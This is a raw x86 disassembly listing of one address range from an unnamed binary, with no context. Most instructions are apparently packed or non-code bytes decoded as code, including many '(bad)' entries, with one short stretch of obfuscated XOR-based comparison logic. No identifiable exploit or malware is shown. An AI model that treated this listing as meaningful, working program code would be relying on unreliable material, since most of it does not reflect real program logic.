  41439a:	fimul  DWORD PTR [esi+0x29b6eac1]
  4143a0:	ins    BYTE PTR es:[edi],dx
  4143a1:	mov    ebp,0x4e24f842
  4143a6:	dec    ebp
  4143a7:	rol    DWORD PTR ds:0x126b4bc2,cl
  4143ad:	mov    bh,0xff
  4143af:	cs rcr ah,cl
  4143b2:	mov    ecx,0x9e15e547
  4143b7:	jbe    0x41442c
  4143b9:	mov    eax,0xc2ebf4fd
  4143be:	jae    0x4143c6
  4143c0:	iret   
  4143c1:	mov    BYTE PTR ds:0x431e0a53,bh
  4143c7:	jnp    0x4143b5
  4143c9:	call   0x32920e5e
  4143ce:	or     eax,0x9413d073
  4143d3:	lods   al,BYTE PTR ds:[esi]
  4143d4:	es mov esp,0xaf3a9a47
  4143da:	imul   eax,ebx,0xfffffff9
  4143dd:	xchg   BYTE PTR [esi+0x33],bh
  4143e0:	sbb    DWORD PTR [eax+ebx*1+0x2fe06a85],ebp
  4143e7:	inc    esp
  4143e8:	push   edi
  4143e9:	jl     0x41439d
  4143eb:	retf   
  4143ec:	cwde   
  4143ed:	sub    eax,0xf5fb1e85
  4143f2:	in     al,0xfb
  4143f4:	retf   0x1b1e
  4143f7:	xor    eax,DWORD PTR [ebx-0x69e32e0c]
  4143fd:	push   0x4b611db2
  414402:	mul    BYTE PTR [edi]
  414404:	dec    ecx
  414405:	cmp    BYTE PTR [ecx-0x5d82e4f7],cl
  41440b:	adc    al,0x6b
  41440d:	xor    ah,BYTE PTR [ebp+0x5c]
  414410:	xchg   BYTE PTR [eax-0x56],dh
  414413:	push   esi
  414414:	sbb    cl,BYTE PTR [eax-0x67]
  414417:	cmp    DWORD PTR [ecx-0x4cc4eb5c],ebx
  41441d:	test   eax,0x19b4b26
  414422:	push   0xd3e7f10b
  414427:	repz rcl ah,cl
  41442a:	and    ah,BYTE PTR [ebx-0x67813546]
  414430:	cmp    al,0x40
  414432:	mov    esp,0x582791ca
  414437:	pusha  
  414438:	inc    edi
  414439:	leave  
  41443a:	test   dh,0xb9
  41443d:	or     al,0x74
  41443f:	cmp    eax,0xffffff80
  414442:	shr    DWORD PTR [ebx-0x4a8c5688],0xb9
  414449:	clc    
  41444a:	pop    edx
  41444b:	je     0x414464
  41444d:	mov    eax,ds:0x10c897f
  414452:	mov    ds:0xc6325824,al
  414457:	sbb    bh,ch
  414459:	sub    bl,ah
  41445b:	into   
  41445c:	cs int 0xee
  41445f:	pushf  
  414460:	cmp    DWORD PTR [eax],edi
  414462:	add    bh,BYTE PTR [eax-0xb49c03e]
  414468:	ds test eax,0x85d0a227
  41446e:	sbb    eax,0xa255bc6d
  414473:	mov    ch,0x6
  414475:	inc    eax
  414476:	push   0x230110e5
  41447b:	add    bh,bh
  41447d:	dec    ebp
  41447e:	jo     0x414485
  414480:	dec    ebx
  414481:	div    edx
  414483:	add    esp,edx
  414485:	sub    eax,0x5fb9fc6a
  41448a:	add    ch,BYTE PTR [eax+eax*4-0x78]
  41448e:	jg     0x4144de
  414490:	xchg   ebp,eax
  414491:	(bad)  
  414492:	mov    eax,ds:0x6e5ddde2
  414497:	icebp  
  414498:	mov    dl,0xd
  41449a:	lods   eax,DWORD PTR ds:[esi]
  41449b:	out    dx,al
  41449c:	mov    ds:0xae1888ec,eax
  4144a1:	jmp    0x18f7:0x5597cbc0
  4144a8:	pop    edi
  4144a9:	sub    edx,DWORD PTR [edx+ecx*1-0x68243d5b]
  4144b0:	mov    ch,0x27
  4144b2:	ins    DWORD PTR es:[edi],dx
  4144b3:	mov    WORD PTR [esi-0x7a],fs
  4144b6:	xor    dh,ah
  4144b8:	jae    0x414478
  4144ba:	(bad)  
  4144bb:	jge    0x4144f3
  4144bd:	and    BYTE PTR [edi],ch
  4144bf:	or     DWORD PTR [eax],0x5f4f89e2
  4144c5:	mov    cl,0xeb
  4144c7:	push   es
  4144c8:	into   
  4144c9:	pop    edx
  4144ca:	minps  xmm5,XMMWORD PTR [edx+ebx*4-0x7a50b970]
  4144d2:	or     ecx,esi
  4144d4:	jbe    0x4144c5
  4144d6:	test   DWORD PTR [edi-0x12],ecx
  4144d9:	int    0x3e
  4144db:	inc    esp
  4144dc:	out    0x9e,eax
  4144de:	popa   
  4144df:	int3   
  4144e0:	cmp    BYTE PTR [eax-0x3d],cl
  4144e3:	(bad)  
  4144e4:	adc    DWORD PTR [ebp+0x2c],edx
  4144e7:	js     0x414562
  4144e9:	fsubp  st(7),st
  4144eb:	add    BYTE PTR [edi],0xe3
  4144ee:	lds    ebp,FWORD PTR cs:[eax+0xc13fa8d]
  4144f5:	mov    al,0xee
  4144f7:	add    DWORD PTR [edx],ebx
  4144f9:	aam    0xaa
  4144fb:	mov    BYTE PTR [esi-0x7db94e54],dl
  414501:	cmp    al,0x9c
  414503:	adc    al,0xfe
  414505:	(bad)  [ebp+0x7c]
  414508:	xor    eax,0xa98d3bea
  41450d:	hlt    
  41450e:	jle    0x414524
  414510:	call   0x38abd53
  414515:	popf   
  414516:	push   edi
  414517:	pop    ecx
  414518:	loop   0x4144fc
  41451a:	push   ebp
  41451b:	push   ebp
  41451c:	push   ebp
  41451d:	sub    ecx,esp
  41451f:	rol    ecx,cl
  414521:	mov    ebx,0x3fcd0a5
  414526:	pop    eax
  414527:	mov    BYTE PTR [edi-0x35aeb847],ah
  41452d:	call   0xccb9:0x7dce27
  414534:	push   0xffffffe7
  414536:	xchg   ebp,eax
  414537:	ret    
  414538:	pop    ss
  414539:	aaa    
  41453a:	xchg   edi,eax
  41453b:	int3   
  41453c:	push   es
  41453d:	inc    ebp
  41453e:	mov    bh,0x83
  414540:	push   cs
  414541:	jmp    0xf57a970c
  414546:	add    ebx,DWORD PTR [edx+0x3b]
  414549:	int    0xa4
  41454b:	jbe    0x41459f
  41454d:	in     eax,dx
  41454e:	xor    eax,0xdb1f2fd9
  414553:	shl    BYTE PTR [ebp-0x45a6c78f],cl
  414559:	lods   eax,DWORD PTR ds:[esi]
  41455a:	cli    
  41455b:	arpl   WORD PTR [ebx],bp
  41455d:	call   0xf973:0x75393a94
  414564:	xor    esi,DWORD PTR [ecx]
  414566:	cmp    DWORD PTR [ebx+0x524da095],0x7fdd34b9
  414570:	inc    esi
  414571:	dec    esi
  414572:	(bad)  
  414573:	adc    eax,0xf3f998cc
  414578:	gs cld 
  41457a:	cwde   
  41457b:	test   al,0x3
  41457d:	adc    eax,0xf795eed5
  414582:	mov    edx,0x8661c66b
  414587:	push   cs
  414588:	and    DWORD PTR [edx-0x15aa72f2],0x7e
  41458f:	mov    cl,0xfe
  414591:	daa    
  414592:	mov    edx,0xbc106e00
  414597:	sahf   
  414598:	sub    al,0xc3
  41459a:	inc    ebx
  41459b:	xor    eax,0x821389e7
  4145a0:	stos   BYTE PTR es:[edi],al
  4145a1:	scas   eax,DWORD PTR es:[edi]
  4145a2:	out    0x85,eax
  4145a4:	adc    al,0x22
  4145a6:	aaa    
  4145a7:	scas   al,BYTE PTR es:[edi]
  4145a8:	add    DWORD PTR ds:0x2e3da9ab,ebx
  4145ae:	scas   eax,DWORD PTR es:[edi]
  4145af:	or     ecx,esp
  4145b1:	dec    ebp
  4145b2:	imul   edx,eax,0xffffffda
  4145b5:	push   ss
  4145b6:	sub    al,0x7c
  4145b8:	mov    dl,0x95
  4145ba:	imul   BYTE PTR [eax]
  4145bc:	jmp    0x5fa4:0xe7de8cb3
  4145c3:	mov    si,0x6088
  4145c7:	ja     0x414637
  4145c9:	pop    ss
  4145ca:	push   ecx
  4145cb:	cdq    
  4145cc:	call   0x70fcf997
  4145d1:	mov    ah,0xfa
  4145d3:	scas   al,BYTE PTR es:[edi]
  4145d4:	in     eax,dx
  4145d5:	push   ecx
  4145d6:	mov    BYTE PTR [edx],ch
  4145d8:	adc    edi,DWORD PTR [ecx+0x31]
  4145db:	pop    esi
  4145dc:	adc    ch,BYTE PTR [ecx+0x7d9f2464]
  4145e2:	ja     0x41457c
  4145e4:	test   edx,0xa5dcaa13
  4145ea:	add    eax,0x531e8349
  4145ef:	inc    ebx
  4145f0:	pop    esp
  4145f1:	sub    BYTE PTR [ebp-0x5654cfe7],cl
  4145f7:	icebp  
  4145f8:	bswap  esp
  4145fa:	je     0x414622
  4145fc:	std    
  4145fd:	or     ebp,DWORD PTR gs:[esi-0x19]
  414601:	push   edx
  414602:	imul   ecx,DWORD PTR [ecx-0x2b57f35b],0xffffffc9
  414609:	retf   0x68e9
  41460c:	jl     0x41459a
  41460e:	mov    eax,0xbb7e207b
  414613:	add    DWORD PTR [edx+0x1b6fb5b9],edx
  414619:	or     BYTE PTR [ebx-0x1a],cl
  41461c:	jmp    0x3f190577
  414621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414622:	mov    dh,0x59
  414624:	int    0xe9
  414626:	jno    0x41464b
  414628:	or     al,0xa6
  41462a:	push   edi
  41462b:	xor    cl,BYTE PTR ds:0xc2c7833a
  414631:	sub    eax,0xac293fc1
  414636:	mov    ecx,0xc6f453e5
  41463b:	inc    esp
  41463c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41463d:	mov    WORD PTR [esi+0x27428e50],?
  414643:	fcom   st(1)
  414645:	or     DWORD PTR [edx+ebx*8-0x2b1eeaa7],0x5c6acdb9
  414650:	push   es
  414651:	ds mov ebp,0x8264b613
  414657:	xchg   ebp,eax
  414658:	cmp    eax,0x1327346b
  41465d:	adc    al,0xb8
  41465f:	mov    dl,0xa9
  414661:	ret    
  414662:	repnz ins BYTE PTR es:[edi],dx
  414664:	sbb    ebp,DWORD PTR [eax-0x78063667]
  41466a:	xchg   esp,eax
  41466b:	in     al,0x7e
  41466d:	fld    QWORD PTR [eax]
  41466f:	pop    ecx
  414670:	pop    eax
  414671:	mov    edx,0x2be0e68d
  414676:	inc    ebx
  414677:	xor    BYTE PTR ds:0xb9d7ea27,ah
  41467d:	xchg   esp,eax
  41467e:	jl     0x4146d5
  414680:	add    esp,DWORD PTR [edi]
  414682:	mov    ds:0xd664ed78,eax
  414687:	inc    ecx
  414688:	(bad)  
  414689:	int3   
  41468a:	xchg   ecx,eax
  41468b:	test   DWORD PTR [edx-0x33],ecx
  41468e:	sahf   
  41468f:	enter  0x3739,0xa3
  414693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414694:	jno    0x4146f4
  414696:	jns    0x41468f
  414698:	mov    cl,0xbf
  41469a:	ds lock jb 0x414647
  41469e:	sub    BYTE PTR [ebx-0x306671e6],0xf7
  4146a5:	dec    ecx
  4146a6:	push   edi
  4146a7:	test   al,0xd6
  4146a9:	loop   0x4146e4
  4146ab:	or     DWORD PTR [eax+0x223d382a],0xffffffdb
  4146b2:	leave  
  4146b3:	clc    
  4146b4:	cmp    DWORD PTR ds:0xed482204,0x34d70ff4
  4146be:	sbb    DWORD PTR [esi],ecx
  4146c0:	sub    al,0x7a
  4146c2:	in     eax,dx
  4146c3:	jne    0x4146df
  4146c5:	in     eax,0x59
  4146c7:	shl    DWORD PTR [ecx-0x1a9a7d21],1
  4146cd:	adc    DWORD PTR [ebp+0x740ebaad],eax
  4146d3:	ror    DWORD PTR [esi+0xca55a4],1
  4146d9:	ret    
  4146da:	mov    BYTE PTR [esi],ah
  4146dc:	mov    ds:0x8bf60d0b,eax
  4146e1:	push   edx
  4146e2:	xor    DWORD PTR [ecx+0x20],ebp
  4146e5:	push   ebx
  4146e6:	inc    ecx
  4146e7:	fwait
  4146e8:	dec    esp
  4146e9:	into   
  4146ea:	xor    esp,DWORD PTR ds:0x991b8f6a
  4146f0:	into   
  4146f1:	aas    
  4146f2:	sbb    al,0x75
  4146f4:	sub    ecx,esp
  4146f6:	daa    
  4146f7:	pop    ecx
  4146f8:	test   eax,0xd65f6c3f
  4146fd:	xchg   ecx,eax
  4146fe:	mov    ebp,0x36409503
  414703:	iret   
  414704:	inc    eax
  414705:	or     al,0xb1
  414707:	inc    ecx
  414708:	mov    al,ds:0xfcbb9611
  41470d:	sti    
  41470e:	jne    0x41471d
  414710:	pushf  
  414711:	sub    al,BYTE PTR [edi+0x5c7805b3]
  414717:	mov    eax,0x8a39f34c
  41471c:	inc    ecx
  41471d:	(bad)  
  41471e:	fist   WORD PTR [edi]
  414720:	mov    edx,0xfe40a2d6
  414725:	fdiv   st,st(4)
  414727:	inc    eax
  414728:	mov    ebp,0x6db835d0
  41472d:	pushf  
  41472e:	pop    ebp
  41472f:	push   ds
  414730:	aaa    
  414731:	aaa    
  414732:	pop    ebx
  414733:	push   esi
  414734:	sti    
  414735:	(bad)  
  414736:	aaa    
  414737:	lods   al,BYTE PTR ds:[esi]
  414738:	(bad)  
  414739:	aad    0x1e
  41473b:	iret   
  41473c:	ds (bad) 
  41473e:	dec    esp
  41473f:	adc    dh,BYTE PTR [edx*8-0x2b01fc11]
  414746:	and    al,0xd0
  414748:	xor    BYTE PTR [eax],ah
  41474a:	push   es
  41474b:	lods   al,BYTE PTR ds:[esi]
  41474c:	pop    ds
  41474d:	repnz out dx,al
  41474f:	add    cl,ah
  414751:	scas   eax,DWORD PTR es:[edi]
  414752:	cmp    eax,0xf958ca29
  414757:	mov    eax,ds:0x5e6379c2
  41475c:	repnz cmp dh,0xb4
  414760:	cld    
  414761:	fcmovne st,st(4)
  414763:	jno    0x414743
  414765:	mov    ebp,0x56e63bbd
  41476a:	push   esp
  41476b:	aad    0x8f
  41476d:	add    ecx,eax
  41476f:	outs   dx,BYTE PTR ds:[esi]
  414770:	pop    ds
  414771:	mov    edx,0xaf6c9ffd
  414776:	das    
  414777:	test   BYTE PTR [ebx+0x4],cl
  41477a:	sub    eax,esp
  41477c:	xchg   BYTE PTR [ecx-0x5e],bh
  41477f:	iret   
  414780:	push   es
  414781:	add    eax,0x5f6c0314
  414786:	shl    DWORD PTR [ecx+edi*4],1
  414789:	jle    0x4147d2
  41478b:	rcl    DWORD PTR [ebx+0x46b89edb],cl
  414791:	adc    BYTE PTR [eax+0x47],al
  414794:	sbb    eax,0xeb2ce0bf
  414799:	xor    eax,0x9a340b92
  41479e:	mov    esp,0xe5b2aa69
  4147a3:	push   0x64e19ae6
  4147a8:	lock daa 
  4147aa:	and    eax,0x8756b074
  4147af:	mov    edi,0x6127d1ed
  4147b4:	cmp    bl,BYTE PTR [esi+0x2c]
  4147b7:	dec    edx
  4147b8:	fdivr  QWORD PTR [edi+esi*1-0x3]
  4147bc:	leave  
  4147bd:	nop
  4147be:	xchg   edi,eax
  4147bf:	xchg   edi,eax
  4147c0:	xchg   edi,eax
  4147c1:	in     al,dx
  4147c2:	xchg   esi,eax
  4147c3:	je     0x4147ee
  4147c5:	ficom  WORD PTR [esi+0x5b9e439d]
  4147cb:	out    0x7a,eax
  4147cd:	dec    ebp
  4147ce:	mov    ch,0xc2
  4147d0:	aas    
  4147d1:	cdq    
  4147d2:	stc    
  4147d3:	sti    
  4147d4:	inc    esp
  4147d5:	push   0xffffffb1
  4147d7:	add    ch,bh
  4147d9:	xchg   ecx,eax
  4147da:	ja     0x4147bb
  4147dc:	jb     0x414830
  4147de:	adc    bh,BYTE PTR [ebp-0x310f07ab]
  4147e4:	jecxz  0x41481b
  4147e6:	and    ebp,ecx
  4147e8:	pushf  
  4147e9:	inc    edi
  4147ea:	int3   
  4147eb:	mov    al,0x53
  4147ed:	pushf  
  4147ee:	xchg   ecx,eax
  4147ef:	aas    
  4147f0:	imul   esi,ecx,0xffffffb5
  4147f3:	sti    
  4147f4:	pop    esp
  4147f5:	mov    esp,0xecf86c2b
  4147fa:	sar    BYTE PTR [esi-0x48],1
  4147fd:	mov    esp,0x7018d351
  414802:	retf   0x6bf4
  414805:	sub    BYTE PTR [edx],dh
  414807:	cmp    BYTE PTR [ebp-0x5e2e8a17],bl
  41480d:	out    dx,al
  41480e:	ins    BYTE PTR es:[edi],dx
  41480f:	mov    DWORD PTR [ecx],edi
  414811:	adc    eax,DWORD PTR [ecx+0x2f]
  414814:	cdq    
  414815:	stos   DWORD PTR es:[edi],eax
  414816:	add    al,BYTE PTR [edx]
  414818:	jmp    0x2566:0x3146ab6d
  41481f:	mov    al,0x89
  414821:	or     al,bl
  414823:	push   cs
  414824:	pop    eax
  414825:	dec    eax
  414826:	adc    edx,ebx
  414828:	loopne 0x4148a1
  41482a:	cmc    
  41482b:	test   al,0x74
  41482d:	popf   
  41482e:	sub    al,0x12
  414830:	xchg   ebx,eax
  414831:	scas   eax,DWORD PTR es:[edi]
  414832:	cmp    bl,BYTE PTR [ecx]
  414834:	jae    0x41482a
  414836:	xchg   BYTE PTR [ebp-0xaee3b49],ah
  41483c:	sub    ah,BYTE PTR [ebp-0x10]
  41483f:	and    al,0xec
  414841:	pop    ss
  414842:	xor    bl,dl
  414844:	jb     0x414893
  414846:	jmp    0x829c:0xec397f9c
  41484d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41484e:	pop    eax
  41484f:	pop    esp
  414850:	adc    ch,0xd9
  414853:	cmp    bh,BYTE PTR [ebx]
  414855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414856:	sbb    DWORD PTR [edi+0x16],eax
  414859:	push   ecx
  41485a:	xor    eax,0xf1a236
  41485f:	or     eax,0x2436bcd3
  414864:	mov    DWORD PTR [ebx-0x367ee020],esi
  41486a:	cmp    ebx,DWORD PTR [edx]
  41486c:	in     eax,0x1f
  41486e:	inc    esi
  41486f:	sbb    eax,0x5ed4f2dc
  414874:	daa    
  414875:	dec    eax
  414876:	xor    BYTE PTR [ebx+0xc01562],ah
  41487c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41487d:	mov    cl,bl
  41487f:	cmp    cl,BYTE PTR [ebx+0x5d]
  414882:	and    BYTE PTR [ecx],ch
  414884:	xchg   ebx,eax
  414885:	(bad)  
  414886:	out    dx,al
  414887:	and    ebp,edi
  414889:	jg     0x4148ca
  41488b:	(bad)  
  41488c:	push   edx
  41488d:	das    
  41488e:	mov    cl,0x1e
  414890:	add    DWORD PTR [ebp-0x18f25bb0],edx
  414896:	add    bl,dh
  414898:	push   eax
  414899:	and    ebx,ebp
  41489b:	mov    al,ds:0x1d79ab6c
  4148a0:	fist   WORD PTR [edx]
  4148a2:	pop    esp
  4148a3:	retf   
  4148a4:	lods   eax,DWORD PTR ds:[esi]
  4148a5:	popf   
  4148a6:	je     0x4148c8
  4148a8:	mov    eax,0x3727fee5
  4148ad:	ret    0xb22d
  4148b0:	sbb    al,0x9a
  4148b2:	out    dx,al
  4148b3:	sub    ebx,esp
  4148b5:	bound  ecx,QWORD PTR [ebx+0x2bcf7113]
  4148bb:	jns    0x4148b7
  4148bd:	dec    esp
  4148be:	sub    al,0xf9
  4148c0:	(bad)  
  4148c2:	jmp    0x414912
  4148c4:	call   0xdfe9:0x17a566fa
  4148cb:	cmp    eax,0x565698ae
  4148d0:	add    al,0x1d
  4148d2:	dec    edx
  4148d3:	sbb    edx,edi
  4148d5:	and    eax,0xe0224f62
  4148da:	mov    cl,0x80
  4148dc:	dec    eax
  4148dd:	leave  
  4148de:	sti    
  4148df:	mov    DWORD PTR [ebx+0x1b672086],0x11f379d2
  4148e9:	xchg   ebp,eax
  4148ea:	sbb    al,0xfb
  4148ec:	pop    eax
  4148ed:	jb     0x4148e1
  4148ef:	adc    al,0xb4
  4148f1:	xor    al,0xc
  4148f3:	and    DWORD PTR [edi],esp
  4148f5:	mov    WORD PTR [eax],es
  4148f7:	xchg   ecx,eax
  4148f8:	ins    BYTE PTR es:[edi],dx
  4148f9:	stc    
  4148fa:	xlat   BYTE PTR ds:[ebx]
  4148fb:	pop    esp
  4148fc:	mov    BYTE PTR [edx-0x54],cl
  4148ff:	pop    ebp
  414900:	xchg   esi,esi
  414902:	mov    eax,0xaf5458d2
  414907:	scas   eax,DWORD PTR es:[edi]
  414908:	es push 0x6e39c604
  41490e:	xchg   ecx,eax
  41490f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414910:	mov    edx,DWORD PTR [ebp-0xc]
  414913:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    bl,BYTE PTR [edx-0x7f]
  414991:	and    al,0xba
  414993:	dec    esi
  414994:	xchg   esp,eax
  414995:	jp     0x414a12
  414997:	mov    cl,0x9c
  414999:	jnp    0x414a16
  41499b:	je     0x414980
  41499d:	fs sub esi,edi
  4149a0:	adc    eax,0xfd08d978
  4149a5:	pop    edx
  4149a6:	cs (bad) 
  4149a9:	lods   al,BYTE PTR ds:[esi]
  4149aa:	call   0xea36:0xd69b3a1f
  4149b1:	sahf   
  4149b2:	mov    al,0x8d
  4149b4:	pop    edi
  4149b5:	mov    edx,0x49f3d3e7
  4149ba:	dec    ebx
  4149bb:	sbb    al,0x46
  4149bd:	test   al,0x73
  4149bf:	xor    BYTE PTR [ebx+eax*1+0x1b076589],bl
  4149c6:	jge    0x414984
  4149c8:	push   es
  4149c9:	aad    0xe6
  4149cb:	inc    esp
  4149cc:	setg   BYTE PTR ds:[ecx+0x6b4d3849]
  4149d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149d5:	add    edx,DWORD PTR [esi-0x61ea90cc]
  4149db:	jle    0x4149dc
  4149dd:	in     al,0x35
  4149df:	jne    0x414a56
  4149e1:	retf   
  4149e2:	mov    eax,0x71a95b4a
  4149e7:	mov    bl,0xf1
  4149e9:	adc    DWORD PTR [edx+0x3f616bfa],eax
  4149ef:	mov    ebx,0x8344bde5
  4149f4:	mov    ecx,0xb768ae25
  4149f9:	xchg   ecx,eax
  4149fa:	sbb    al,0x60
  4149fc:	rcl    ah,0x2b
  4149ff:	adc    eax,0x7107b34b
  414a04:	popa   
  414a05:	xor    eax,ebx
  414a07:	test   eax,0xd06bae8f
  414a0c:	add    ebx,edx
  414a0e:	sbb    eax,0xe40e35fa
  414a13:	test   eax,0x25f4b10f
  414a18:	pop    ecx
  414a19:	pop    ecx
  414a1a:	xor    al,0xd0
  414a1c:	adc    BYTE PTR [ebx+0xd],ah
  414a1f:	sbb    DWORD PTR [ebx-0x2212723],ebx
  414a25:	int    0x25
  414a27:	xor    eax,0x238803d4
  414a2c:	ret    
  414a2d:	mov    ecx,0xea6599b7
  414a32:	jns    0x414a8f
  414a34:	popf   
  414a35:	test   al,0x65
  414a37:	retf   0x65af
  414a3a:	out    dx,eax
  414a3b:	and    eax,0x70aec07f
  414a40:	(bad)  
  414a41:	daa    
  414a42:	mov    ecx,0xaa60c633
  414a47:	jns    0x414a76
  414a49:	lahf   
  414a4a:	mov    esi,edx
  414a4c:	adc    cl,bl
  414a4e:	dec    eax
  414a4f:	mov    edx,0x201f4dbc
  414a54:	lods   eax,DWORD PTR ds:[esi]
  414a55:	inc    esp
  414a56:	ins    DWORD PTR es:[edi],dx
  414a57:	xor    eax,0x6281489a
  414a5c:	rcr    BYTE PTR [esi],cl
  414a5e:	retf   
  414a5f:	div    DWORD PTR [eax]
  414a61:	xor    DWORD PTR [edx+0x4c],0x8e65533e
  414a68:	(bad)  
  414a69:	loope  0x414a83
  414a6b:	inc    edx
  414a6c:	push   cs
  414a6d:	add    BYTE PTR [ecx-0x48],dl
  414a70:	into   
  414a71:	(bad)  
  414a72:	cmp    cl,al
  414a74:	jae    0x414a76
  414a76:	lods   al,BYTE PTR ds:[esi]
  414a77:	nop    ecx
  414a7a:	popa   
  414a7b:	addr16 lock jne 0x414a49
  414a7f:	cli    
  414a80:	cmp    BYTE PTR [esi-0x32],dh
  414a83:	add    BYTE PTR [ebx+edx*1],bl
  414a86:	pop    ecx
  414a87:	jns    0x414a51
  414a89:	mov    esp,0x7d84f497
  414a8e:	add    ecx,DWORD PTR [eax]
  414a90:	inc    ecx
  414a91:	mov    gs,WORD PTR [ebp-0x5774455e]
  414a97:	cwde   
  414a98:	xor    BYTE PTR [ecx-0xe582810],bl
  414a9e:	push   edx
  414a9f:	out    dx,eax
  414aa0:	js     0x414a9d
  414aa2:	pop    es
  414aa3:	stos   BYTE PTR es:[edi],al
  414aa4:	add    DWORD PTR [edi-0x7260b6ce],ebp
  414aaa:	xchg   ebp,eax
  414aab:	scas   eax,DWORD PTR es:[edi]
  414aac:	inc    ebx
  414aad:	mov    WORD PTR [ecx-0x36],?
  414ab0:	pop    ds
  414ab1:	call   0x199d04b8
  414ab6:	retf   
  414ab7:	test   DWORD PTR [edx],ecx
  414ab9:	fwait
  414aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414abb:	jnp    0x414a95
  414abd:	push   ss
  414abe:	inc    eax
  414abf:	(bad)  
  414ac0:	push   edi
  414ac1:	or     al,0xdb
  414ac3:	inc    ecx
  414ac4:	pop    ebp
  414ac5:	aam    0xb4
  414ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ac8:	icebp  
  414ac9:	pop    es
  414aca:	push   ss
  414acb:	popa   
  414acc:	fcomp  st(3)
  414ace:	rol    BYTE PTR ds:[edi+0x8e2746f],1
  414ad5:	xchg   ebx,eax
  414ad6:	and    BYTE PTR [esi-0x3e6c9d5c],bh
  414adc:	cmp    dl,BYTE PTR [edx+0x56]
  414adf:	aad    0x84
  414ae1:	xchg   ebx,eax
  414ae2:	(bad)  
  414ae3:	cmp    bl,BYTE PTR [edi+0x4a2c8bf5]
  414ae9:	sti    
  414aea:	adc    bh,BYTE PTR [ecx]
  414aec:	jecxz  0x414b17
  414aee:	cdq    
  414aef:	fdiv   QWORD PTR [edi-0x66]
  414af2:	add    bh,al
  414af4:	retf   0xf8e0
  414af7:	jecxz  0x414a81
  414af9:	clc    
  414afa:	dec    esp
  414afb:	dec    ecx
  414afc:	mov    eax,ds:0xff8a05ab
  414b01:	bound  edx,QWORD PTR [edx+0x36]
  414b04:	push   ebx
  414b05:	sbb    DWORD PTR [ebp-0x45eb16f3],eax
  414b0b:	cmp    esp,DWORD PTR [esi-0x290e8950]
  414b11:	(bad)  
  414b12:	call   0x8de1:0x3ca672e2
  414b19:	cmp    bl,BYTE PTR [eax]
  414b1b:	stc    
  414b1c:	mov    ch,ch
  414b1e:	push   ecx
  414b1f:	inc    ebp
  414b20:	stos   DWORD PTR es:[edi],eax
  414b21:	add    bh,bh
  414b23:	cmp    esp,ebx
  414b25:	sub    BYTE PTR [ecx+ebx*2-0x2494bafd],0x62
  414b2d:	repz cmp ah,dh
  414b30:	push   esp
  414b31:	rcl    BYTE PTR [edx],cl
  414b33:	in     eax,0x30
  414b35:	add    eax,0x4db7b684
  414b3a:	jbe    0x414ac1
  414b3c:	or     eax,0x1d2cbb37
  414b41:	loope  0x414aff
  414b43:	and    bh,BYTE PTR [edx]
  414b45:	paddsb mm1,QWORD PTR [eax+0x76]
  414b49:	and    DWORD PTR [ebx+ebp*2],ebp
  414b4c:	adc    edx,edi
  414b4e:	pop    eax
  414b4f:	mov    DWORD PTR [ecx-0x79],edx
  414b52:	les    ebx,FWORD PTR [ebp-0x5bc0ec96]
  414b58:	xchg   edx,eax
  414b59:	imul   edx,DWORD PTR [ebp+eax*2-0x76],0x86a54dff
  414b61:	sar    DWORD PTR [esi-0x217862cb],0x7d
  414b68:	data16 jae 0x414b52
  414b6b:	jg     0x414b39
  414b6d:	push   edi
  414b6e:	mov    BYTE PTR [ecx+0x7e7c27f2],ch
  414b74:	out    dx,eax
  414b75:	xor    DWORD PTR [ecx],eax
  414b77:	inc    esi
  414b78:	push   esi
  414b79:	or     al,0x2d
  414b7b:	adc    BYTE PTR [ecx+0xcf95d73],bh
  414b81:	aaa    
  414b82:	mov    ebx,0x30d07b4e
  414b87:	outs   dx,DWORD PTR ds:[esi]
  414b88:	ret    0xb8d8
  414b8b:	ror    DWORD PTR [edx-0xf3f5720],cl
  414b91:	nop
  414b92:	or     di,WORD PTR [ebp-0x52]
  414b96:	mov    ds:0x3ebfef48,eax
  414b9b:	inc    edi
  414b9c:	jecxz  0x414ba0
  414b9e:	mov    al,0x69
  414ba0:	jmp    0x414bdc
  414ba2:	sbb    al,0x4b
  414ba4:	xchg   ecx,eax
  414ba5:	cmp    ch,bl
  414ba7:	inc    esp
  414ba8:	mov    BYTE PTR [esi+0xe],0x13
  414bac:	xchg   esp,eax
  414bad:	mov    eax,0x23981119
